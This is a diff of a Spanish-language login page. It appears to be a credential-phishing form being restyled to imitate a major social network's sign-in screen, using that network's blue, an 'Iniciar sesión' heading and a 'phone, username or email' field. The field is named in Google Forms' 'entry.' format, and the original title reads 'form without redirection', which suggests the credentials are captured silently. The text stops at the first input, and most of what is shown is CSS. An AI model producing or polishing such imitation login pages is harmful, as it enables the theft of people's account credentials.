@@ -3,36 +3,42 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Formulario sin redirección</title>
+  <title>Iniciar sesión</title>
   <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+      font-family: 'Arial', sans-serif;
+    }
+
     body {
-      font-family: Arial, sans-serif;
       display: flex;
       justify-content: center;
       align-items: center;
       height: 100vh;
-      background-color: #fafafa;
+      background-color: #f0f2f5;
     }
 
     .login-box {
       background: white;
-      padding: 20px;
-      border-radius: 10px;
-      box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.1);
+      padding: 30px;
+      border-radius: 12px;
+      box-shadow: 0px 4px 10px rgba(0, 0, 0, 0.1);
       text-align: center;
-      width: 350px;
+      width: 360px;
       transition: opacity 0.2s ease-in-out;
     }
 
     input {
-      display: block;
-      width: calc(100% - 20px);
-      margin: 10px auto;
+      width: 100%;
       padding: 12px;
+      margin-top: 10px;
       border: 1px solid #ccc;
-      border-radius: 5px;
-      font-size: 16px;
-      box-sizing: border-box;
+      border-radius: 8px;
+      font-size: 14px;
+      background: #fafafa;
+      outline: none;
     }
 
     .password-container {
@@ -40,56 +46,58 @@
       width: 100%;
       display: flex;
       align-items: center;
+      margin-top: 10px;
       border: 1px solid #ccc;
-      border-radius: 5px;
-      padding: 0;
-      background: white;
+      border-radius: 8px;
+      background: #fafafa;
+      padding-right: 12px;
     }
 
     .password-container input {
+      flex: 1;
       border: none;
-      outline: none;
-      padding: 12px;
-      width: 100%;
-      font-size: 16px;
-      box-sizing: border-box;
+      background: none;
     }
 
     .toggle-password {
       background: none;
       border: none;
-      color: #555;
       font-size: 14px;
       cursor: pointer;
-      padding: 12px;
+      color: #1877f2;
       font-weight: bold;
-    }
-
-    .toggle-password:hover {
-      color: #000;
     }
 
     .submit-btn {
       width: 100%;
       padding: 12px;
-      background-color: #007aff;
+      background-color: #1877f2;
       color: white;
       border: none;
-      border-radius: 5px;
+      border-radius: 8px;
       cursor: pointer;
       font-size: 16px;
       margin-top: 15px;
       font-weight: bold;
+      transition: background 0.3s;
     }
 
     .submit-btn:hover {
-      background-color: #005ecb;
+      background-color: #0d65d9;
+    }
+
+    .logo {
+      font-size: 24px;
+      font-weight: bold;
+      color: #333;
+      margin-bottom: 20px;
     }
   </style>
 </head>
 <body>
 
 <div class="login-box" id="loginBox">
+  <div class="logo">Iniciar sesión</div>
   <form id="myForm">
     <input type="text" name="entry.1271603301" placeholder="Teléfono, usuario o correo electrónico" required>
     
